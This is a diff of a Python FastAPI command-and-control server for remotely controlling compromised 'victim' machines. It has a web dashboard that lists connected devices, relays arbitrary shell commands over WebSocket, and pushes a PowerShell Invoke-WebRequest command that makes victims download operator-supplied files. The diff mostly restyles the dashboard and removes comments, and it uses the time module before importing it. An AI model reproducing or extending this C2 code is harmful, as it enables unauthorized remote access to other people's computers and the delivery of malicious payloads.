@@ -1,18 +1,18 @@
 import os
 import uuid
 import asyncio
-from fastapi import FastAPI, WebSocket, UploadFile, File, Form, HTTPException
+from fastapi import FastAPI, WebSocket, UploadFile, File, Form
 from fastapi.staticfiles import StaticFiles
-from fastapi.responses import HTMLResponse, FileResponse
+from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
 from typing import Dict, Any
 
 app = FastAPI()
 
-# Хранилище сессий: {session_id: {"ws": websocket, "cmd_history": []}}
+# Хранилище сессий
 sessions: Dict[str, dict] = {}
 
-# Папка для временного хранения файлов перед отправкой жертве
+# Папка для файлов
 UPLOAD_DIR = "uploads"
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 
@@ -22,44 +22,55 @@ class Command(BaseModel):
 
 @app.get("/", response_class=HTMLResponse)
 async def dashboard():
-    # Простой интерфейс для управления
     return """
     <!DOCTYPE html>
-    <html>
+    <html lang="ru">
     <head>
-        <title>C2 Dashboard</title>
+        <meta charset="UTF-8">
+        <title>C2 Dashboard v2</title>
         <style>
-            body { background: #1e1e1e; color: #0f0; font-family: monospace; padding: 20px; }
-            .container { display: flex; gap: 20px; height: 90vh; }
-            #sessions { width: 20%; border-right: 1px solid #333; overflow-y: auto; }
-            .sess-btn { display: block; width: 100%; margin-bottom: 5px; padding: 10px; cursor: pointer; background: #333; color: white; border: none; text-align: left; }
-            .sess-btn.active { background: #006400; }
-            #console { width: 70%; background: #000; padding: 10px; overflow-y: scroll; border: 1px solid #333; }
-            #input-area { width: 100%; display: flex; gap: 10px; margin-top: 10px; }
-            input[type="text"] { flex-grow: 1; background: #111; color: white; border: 1px solid #555; padding: 10px; }
-            button { padding: 10px 20px; cursor: pointer; }
-            .log-line { margin: 2px 0; word-break: break-all; }
-            .error { color: red; }
-            .success { color: cyan; }
+            body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; margin: 0; padding: 0; display: flex; height: 100vh; overflow: hidden; }
+            .sidebar { width: 250px; background: #161b22; border-right: 1px solid #30363d; display: flex; flex-direction: column; }
+            .sidebar h2 { padding: 20px; margin: 0; background: #21262d; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
+            .device-list { flex-grow: 1; overflow-y: auto; }
+            .device-item { padding: 15px; cursor: pointer; border-bottom: 1px solid #30363d; transition: 0.2s; display: flex; align-items: center; gap: 10px; }
+            .device-item:hover { background: #21262d; }
+            .device-item.active { background: #1f6feb; color: white; }
+            .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #238636; }
+            .main { flex-grow: 1; display: flex; flex-direction: column; padding: 20px; }
+            .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+            .console-area { flex-grow: 1; background: #010409; border: 1px solid #30363d; border-radius: 6px; padding: 10px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 13px; margin-bottom: 15px; }
+            .input-area { display: flex; gap: 10px; }
+            input[type="text"] { flex-grow: 1; background: #0d1117; border: 1px solid #30363d; color: white; padding: 10px; border-radius: 6px; }
+            button { background: #238636; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; }
+            button:hover { background: #2ea043; }
+            .log-line { margin: 2px 0; word-break: break-all; border-bottom: 1px solid #21262d; padding: 2px 0; }
+            .cmd-prefix { color: #58a6ff; font-weight: bold; }
+            .output-prefix { color: #8b949e; }
+            .error { color: #f85149; }
+            .success { color: #3fb950; }
+            .upload-btn { background: #1f6feb; }
         </style>
     </head>
     <body>
-        <h2>Remote Shell C2</h2>
-        <div class="container">
-            <div id="sessions">
-                <h3>Active Sessions</h3>
-                <!-- Список сессий генерируется JS -->
+        <div class="sidebar">
+            <h2>Devices (<span id="count">0</span>)</h2>
+            <div class="device-list" id="deviceList"></div>
+        </div>
+        <div class="main">
+            <div class="header">
+                <h3 id="currentSession">Select a device</h3>
+                <button onclick="refreshList()" style="background:#30363d;">Refresh</button>
             </div>
-            <div style="width: 80%; display: flex; flex-direction: column;">
-                <div id="console"></div>
-                <div id="input-area">
-                    <input type="text" id="cmdInput" placeholder="Enter command..." onkeydown="if(event.key==='Enter') sendCmd()">
-                    <button onclick="sendCmd()">Send CMD</button>
-                    <input type="file" id="fileInput" onchange="uploadFile()">
-                    <button onclick="document.getElementById('fileInput').click()">Upload File to Victim</button>
-                </div>
+            <div class="console-area" id="console"></div>
+            <div class="input-area">
+                <input type="text" id="cmdInput" placeholder="Enter command..." onkeydown="if(event.key==='Enter') sendCmd()">
+                <button onclick="sendCmd()">Run</button>
+                <button class="upload-btn" onclick="document.getElementById('fileInput').click()">Upload File</button>
+                <input type="file" id="fileInput" style="display:none" onchange="uploadFile()">
             </div>
         </div>
+
         <script>
             let currentSessionId = null;
             let ws = null;
@@ -68,12 +79,28 @@ async def dashboard():
                 const c = document.getElementById('console');
                 const d = document.createElement('div');
                 d.className = 'log-line ' + type;
-                d.innerText = msg;
+                d.innerHTML = `<span class="${type === 'cmd' ? 'cmd-prefix' : 'output-prefix'}">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
                 c.appendChild(d);
                 c.scrollTop = c.scrollHeight;
             }
 
-            // Подключение к WebSocket
+            function updateUI() {
+                fetch('/sessions')
+                    .then(r => r.json())
+                    .then(ids => {
+                        document.getElementById('count').innerText = ids.length;
+                        const list = document.getElementById('deviceList');
+                        list.innerHTML = '';
+                        ids.forEach(id => {
+                            const div = document.createElement('div');
+                            div.className = 'device-item' + (id === currentSessionId ? ' active' : '');
+                            div.innerHTML = `<div class="status-dot"></div> ID: ${id.slice(0, 8)}`;
+                            div.onclick = () => connectWS(id);
+                            list.appendChild(div);
+                        });
+                    });
+            }
+
             function connectWS(sessionId) {
                 if (ws) ws.close();
                 const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
@@ -81,26 +108,37 @@ async def dashboard():
                 
                 ws.onopen = () => {
                     log(`Connected to ${sessionId}`, 'success');
-                    updateButtons();
+                    currentSessionId = sessionId;
+                    document.getElementById('currentSession').innerText = sessionId;
+                    updateUI();
                 };
                 ws.onmessage = (event) => {
-                    log(event.data);
+                    // Если приходит ответ на команду
+                    try {
+                        const data = JSON.parse(event.data);
+                        if(data.output) log(data.output);
+                    } catch(e) {
+                        log(event.data);
+                    }
                 };
                 ws.onclose = () => {
-                    log(`Disconnected from ${sessionId}`, 'error');
-                    updateButtons();
+                    log('Disconnected', 'error');
+                    currentSessionId = null;
+                    updateUI();
                 };
-                ws.onerror = (err) => console.error(err);
             }
 
             function sendCmd() {
                 const cmd = document.getElementById('cmdInput').value;
                 if (!cmd || !currentSessionId) return;
+                
+                log(cmd, 'cmd');
                 fetch('/cmd', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({session_id: currentSessionId, command: cmd})
-                });
+                }).catch(() => log("Failed to send", "error"));
+                
                 document.getElementById('cmdInput').value = '';
             }
 
@@ -113,43 +151,22 @@ async def dashboard():
                 formData.append('file', file);
                 
                 try {
-                    const res = await fetch(`/upload/${currentSessionId}`, {
-                        method: 'POST',
-                        body: formData
-                    });
+                    const res = await fetch(`/upload/${currentSessionId}`, {method: 'POST', body: formData});
                     const data = await res.json();
                     log(data.message || data.detail, data.ok ? 'success' : 'error');
                 } catch (e) {
-                    log('Upload failed: ' + e.message, 'error');
+                    log('Upload failed', 'error');
                 }
             }
 
-            function updateButtons() {
-                const btns = document.querySelectorAll('.sess-btn');
-                btns.forEach(b => b.classList.remove('active'));
-                if (currentSessionId && ws && ws.readyState === WebSocket.OPEN) {
-                    const activeBtn = document.querySelector(`.sess-btn[data-id="${currentSessionId}"]`);
-                    if (activeBtn) activeBtn.classList.add('active');
-                }
+            function refreshList() {
+                updateUI();
+                log("List refreshed");
             }
 
-            // Инициализация списка сессий при загрузке
-            fetch('/sessions')
-                .then(r => r.json())
-                .then(sessions => {
-                    const container = document.getElementById('sessions');
-                    sessions.forEach(id => {
-                        const btn = document.createElement('button');
-                        btn.className = 'sess-btn';
-                        btn.dataset.id = id;
-                        btn.innerText = `ID: ${id.slice(0,8)}...`;
-                        btn.onclick = () => {
-                            currentSessionId = id;
-                            connectWS(id);
-                        };
-                        container.appendChild(btn);
-                    });
-                });
+            // Auto-refresh list every 5 seconds
+            setInterval(updateUI, 5000);
+            updateUI();
         </script>
     </body>
     </html>
@@ -159,11 +176,12 @@ async def dashboard():
 async def websocket_endpoint(websocket: WebSocket, session_id: str):
     await websocket.accept()
     sessions[session_id]["ws"] = websocket
+    sessions[session_id]["last_seen"] = time.time()
+    
     try:
         while True:
-            # Ждем сообщения от клиента (если нужно двустороннее общение в будущем)
             data = await websocket.receive_text()
-            # Логика обработки входящих данных от жертвы
+            # Можно добавить логику обработки входящих данных от жертвы
     except Exception:
         pass
     finally:
@@ -176,7 +194,6 @@ async def execute_command(cmd_data: Command):
     if session_id not in sessions:
         return {"status": "error", "message": "Session not found"}
     
-    # Отправляем команду жертве через WebSocket
     ws = sessions[session_id].get("ws")
     if ws:
         await ws.send_text(f"CMD:{cmd_data.command}")
@@ -188,22 +205,14 @@ async def upload_file_to_victim(session_id: str, file: UploadFile = File(...)):
     if session_id not in sessions:
         return {"status": "error", "message": "Session not found"}
     
-    # Сохраняем файл локально на сервере
     file_path = os.path.join(UPLOAD_DIR, file.filename)
     with open(file_path, "wb") as buffer:
         buffer.write(await file.read())
         
-    # Отправляем путь к файлу жертве (она должна будет его забрать или выполнить)
-    # В данной реализации мы просто сообщаем жертве, что файл доступен по пути
-    # Или можно отправить сам бинарник через websocket, но это тяжелее.
-    # Здесь мы скажем жертве скачать его с нашего сайта или передадим бинарник напрямую.
-    # Для простоты: жертва получит команду скачать файл с нашего статического сервера.
-    
     download_url = f"http://{app.state.app_host or 'localhost'}:8000/files/{file.filename}"
     
     ws = sessions[session_id].get("ws")
     if ws:
-        # Команда для жертвы: скачать файл и запустить/сохранить
         cmd = f"powershell -c Invoke-WebRequest -Uri '{download_url}' -OutFile '%TEMP%\\{file.filename}'"
         await ws.send_text(f"FILE_CMD:{cmd}")
         return {"status": "ok", "message": f"Command sent to download {file.filename}"}
@@ -216,6 +225,5 @@ async def get_sessions():
 
 if __name__ == "__main__":
     import uvicorn
-    # Укажите хост и порт, к которому будет подключаться жертва
-    # Если жертва в другой сети, нужен публичный IP или туннель
+    import time
     uvicorn.run(app, host="0.0.0.0", port=8000)
